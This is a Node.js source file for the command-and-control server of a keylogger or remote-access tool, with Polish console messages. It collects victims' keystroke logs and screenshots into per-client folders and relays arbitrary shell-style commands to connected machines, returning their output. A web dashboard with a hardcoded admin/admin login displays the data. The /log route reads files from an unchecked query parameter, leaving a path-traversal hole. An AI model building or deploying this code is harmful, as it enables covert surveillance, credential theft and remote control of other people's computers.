const express = require("express");
const session = require("express-session");
const socketio = require("socket.io");
const fs = require("fs");
const app = express();
const render = require("./js/views.js");

const server = app.listen(3000, function () {
  console.log("App listening on port 3000!");
});
const io = socketio(server);

let clients = [];
let offlineclients = [];
getOfflineClients();

app.use(express.json());

app.use(express.urlencoded({ extended: true }));

app.use(express.static("views"));
app.use(express.static("clients"));

app.use(express.static(__dirname + "/public")); //Set public files to use

app.set("view engine", "ejs");

app.use(
  session({
    secret: "test",
    resave: true,
    saveUninitialized: true,
    cookie: { secure: false }, //Remember to set it to true!
  })
);

app.get("/", render.mainPage); //Render main page with login and register etc.

app.get("/dashboard", render.dashboard); //Render main page with login and register etc.

app.get("/console", render.console); //

app.post("/", function (req, res) {
  if (req.body.username == "admin" && req.body.password == "admin") {
    console.log(`Logged in dashboard: ${req.socket.remoteAddress}`);
    req.session.isLogged = true;
    req.session.username = req.body.username;
    res.redirect("/dashboard");
  } else res.render("index");
});

app.get("/log", (req, res) => {
  var fileContents;
  try {
    fileContents = fs.readFileSync(
      "./clients/" + req.query.clientname + "/logs/log.txt"
    );
  } catch (err) {
    // Here you get the error when the file was not found,
    // but you also get any other error
  }
  res.render("log", { content: fileContents });
});

app.post("/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error(err);
    } else {
      res.redirect("/");
    }
  });
});

io.on("connection", (socket) => {
  socket.on("join", (msg) => {
    let info = msg.split(":");
    socket.ip = info[0];
    socket.name = info[1];
    socket.version = info[2];
    console.log("Dolaczono: " + socket.name + " " + socket.ip);
    clients.push({
      id: socket.id,
      name: socket.name,
      ip: socket.ip,
      version: socket.version,
    });
    checkDirectoryExists(socket.name);
    offlineclients.splice(offlineclients.indexOf(socket.name), 1);
    //console.log("Clients: " + clients);
    //socket.emit("command", "screenshot");

  });

  socket.on("logs", async (msg) => {
    await io.fetchSockets(); //fix error c++ first send keystrokes
    //console.log(socket.name + ":" + msg);
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    writeToFile(socket.name, current+msg);
  });

  socket.on("command", (msg) => {
    console.log(msg);
    io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
  });

  socket.on("commandResult", async (msg) => {
    let bufferObj = Buffer.from(msg, "base64");
    let decodedString = bufferObj.toString("utf-8");
    //console.log(decodedString);
    io.emit("commandResult", { id: socket.id, response: decodedString });
  });

  socket.on("screenshotResult", async (msg) => {
    console.log(msg);
    var d = new Date,
    dformat = [d.getMonth()+1,
               d.getDate(),
               d.getFullYear()].join('_')+'-'+
              [d.getHours(),d.getMinutes(),d.getSeconds()].join('_');
    const buffer = Buffer.from(msg, "base64");
    fs.writeFileSync(`./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`, buffer);

  });
  socket.on("delete", async (msg) => {
    fs.rmSync(`./clients/${msg.clientname}`, { recursive: true, force: true });
    offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
  });

  socket.on("disconnect", () => {
    if (socket.name != null) {
      console.log("Wyszedl: " + socket.name + " " + socket.ip);

      //if socket is a keylogger instance
      removeById(clients, socket.id);
      offlineclients.push(socket.name);
    }
  });
});

function checkDirectoryExists(clientname) {
  if (!fs.existsSync(`./clients`)) fs.mkdirSync("./clients");

  if (!fs.existsSync(`./clients/${clientname}`)) {
    fs.mkdirSync(`./clients/${clientname}`);
    fs.mkdirSync(`./clients/${clientname}/logs`);
    fs.mkdirSync(`./clients/${clientname}/screenshots`);
  }
}

function writeToFile(clientname, msg) {
  fs.appendFileSync(`./clients/${clientname}/logs/log.txt`, msg + "\n");
}

const removeById = (arr, id) => {
  const requiredIndex = arr.findIndex((el) => {
    return el.id === String(id);
  });
  if (requiredIndex === -1) {
    return false;
  }
  return !!arr.splice(requiredIndex, 1);
};

function getOfflineClients() {
  offlineclients.length = 0;

  fs.readdirSync("./clients").forEach((file) => {
    offlineclients.push(file);
    //console.log(file);
  });
  return null;
}

exports.clients = clients;
exports.offlineclients = offlineclients;
